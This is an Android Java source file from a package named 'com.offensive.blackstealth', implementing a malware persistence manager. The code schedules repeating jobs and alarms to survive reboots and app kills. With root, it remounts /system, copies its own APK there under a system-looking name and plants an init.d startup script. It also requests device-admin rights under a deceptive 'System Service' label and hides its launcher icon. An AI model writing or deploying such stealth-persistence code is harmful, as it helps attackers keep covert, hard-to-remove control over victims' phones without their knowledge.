package com.offensive.blackstealth.core;

import android.app.AlarmManager;
import android.app.PendingIntent;
import android.app.job.JobInfo;
import android.app.job.JobScheduler;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.os.Build;
import android.util.Log;
import java.io.*;

/**
 * PersistenceManager - Maintains persistence across reboots and app kills
 */
public class PersistenceManager {
    private static final String TAG = "PersistenceManager";
    private static final String PREFS_NAME = "system_config";
    private static final int JOB_ID = 1337;
    
    private Context context;
    private boolean hasRoot = false;
    
    public PersistenceManager(Context context) {
        this.context = context;
        checkRoot();
    }
    
    private void checkRoot() {
        try {
            Process p = Runtime.getRuntime().exec("su -c id");
            BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream()));
            String output = reader.readLine();
            hasRoot = output != null && output.contains("uid=0");
        } catch (Exception e) {
            hasRoot = false;
        }
    }
    
    /**
     * Setup all persistence mechanisms
     */
    public void setupPersistence() {
        setupBootReceiver();
        setupJobScheduler();
        setupAlarmManager();
        if (hasRoot) {
            setupRootPersistence();
        }
        saveState();
    }
    
    /**
     * Setup boot receiver for auto-start
     */
    private void setupBootReceiver() {
        SharedPreferences prefs = context.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE);
        prefs.edit().putBoolean("auto_start", true).apply();
    }
    
    /**
     * Setup JobScheduler for periodic execution
     */
    private void setupJobScheduler() {
        try {
            JobScheduler scheduler = (JobScheduler) context.getSystemService(Context.JOB_SCHEDULER_SERVICE);
            
            ComponentName serviceName = new ComponentName(context, 
                context.getPackageName() + ".PersistenceJobService");
            
            JobInfo.Builder builder = new JobInfo.Builder(JOB_ID, serviceName)
                .setPersisted(true)
                .setPeriodic(15 * 60 * 1000) // 15 minutes
                .setRequiredNetworkType(JobInfo.NETWORK_TYPE_ANY)
                .setRequiresCharging(false)
                .setRequiresDeviceIdle(false);
            
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                builder.setRequiresBatteryNotLow(false);
            }
            
            scheduler.schedule(builder.build());
        } catch (Exception e) {
            Log.e(TAG, "JobScheduler failed: " + e.getMessage());
        }
    }
    
    /**
     * Setup AlarmManager as backup persistence
     */
    private void setupAlarmManager() {
        try {
            AlarmManager am = (AlarmManager) context.getSystemService(Context.ALARM_SERVICE);
            
            Intent intent = new Intent(context, context.getClass());
            intent.setAction("com.system.HEARTBEAT");
            
            PendingIntent pendingIntent = PendingIntent.getBroadcast(
                context, 0, intent, PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_IMMUTABLE);
            
            am.setRepeating(
                AlarmManager.RTC_WAKEUP,
                System.currentTimeMillis() + 60000,
                AlarmManager.INTERVAL_FIFTEEN_MINUTES,
                pendingIntent);
        } catch (Exception e) {
            Log.e(TAG, "AlarmManager failed: " + e.getMessage());
        }
    }
    
    /**
     * Setup root-level persistence
     */
    private void setupRootPersistence() {
        try {
            String apkPath = context.getPackageResourcePath();
            
            // Copy APK to system apps (survives factory reset)
            String[] commands = {
                "mount -o rw,remount /system",
                "cp " + apkPath + " /system/app/SystemService.apk",
                "chmod 644 /system/app/SystemService.apk",
                "mount -o ro,remount /system"
            };
            
            executeRootCommands(commands);
            
            // Add to init.d for early execution
            String initScript = "#!/system/bin/sh\n" +
                "am start -n " + context.getPackageName() + "/.MainActivity";
            
            executeRootCommand("echo '" + initScript + "' > /system/etc/init.d/99system");
            executeRootCommand("chmod 755 /system/etc/init.d/99system");
            
        } catch (Exception e) {
            Log.e(TAG, "Root persistence failed: " + e.getMessage());
        }
    }
    
    /**
     * Install as device admin for enhanced persistence
     */
    public void installAsDeviceAdmin() {
        try {
            Intent intent = new Intent(android.app.admin.DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
            intent.putExtra(android.app.admin.DevicePolicyManager.EXTRA_DEVICE_ADMIN,
                new ComponentName(context, context.getPackageName() + ".DeviceAdminReceiver"));
            intent.putExtra(android.app.admin.DevicePolicyManager.EXTRA_ADD_EXPLANATION,
                "System Service requires admin access");
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            context.startActivity(intent);
        } catch (Exception e) {
            Log.e(TAG, "Device admin install failed: " + e.getMessage());
        }
    }
    
    /**
     * Hide app from launcher
     */
    public void hideFromLauncher() {
        try {
            context.getPackageManager().setComponentEnabledSetting(
                new ComponentName(context, context.getPackageName() + ".MainActivity"),
                android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                android.content.pm.PackageManager.DONT_KILL_APP);
        } catch (Exception e) {
            Log.e(TAG, "Hide from launcher failed: " + e.getMessage());
        }
    }
    
    /**
     * Save state for recovery
     */
    private void saveState() {
        SharedPreferences prefs = context.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE);
        prefs.edit()
            .putLong("install_time", System.currentTimeMillis())
            .putBoolean("persistence_enabled", true)
            .apply();
    }
    
    private void executeRootCommands(String[] commands) throws Exception {
        Process su = Runtime.getRuntime().exec("su");
        DataOutputStream os = new DataOutputStream(su.getOutputStream());
        for (String cmd : commands) {
            os.writeBytes(cmd + "\n");
        }
        os.writeBytes("exit\n");
        os.flush();
        su.waitFor();
    }
    
    private void executeRootCommand(String command) throws Exception {
        executeRootCommands(new String[]{command});
    }
    
    public boolean hasRootAccess() {
        return hasRoot;
    }
}
